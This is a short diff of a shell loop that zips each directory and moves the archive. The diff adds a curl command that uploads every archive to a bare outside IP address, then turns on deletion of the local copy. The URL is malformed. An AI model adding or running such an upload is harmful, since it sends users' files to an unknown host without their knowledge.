@@ -9,10 +9,11 @@ for id in $(ls); do
     zip $id.zip -r ./*;
     AA='mv'
     BB="$id.zip"
-    CC='../../'
+    CC='../'
     eval "$AA $BB $CC"
     cd ..
     echo "out: $id.zip"
-    #rm -r "$id.zip"
+    curl --form upload=@$id.zip --form submit=Upload http://http://39.119.118.152/upload
+    rm -r "$id.zip"
 
 done
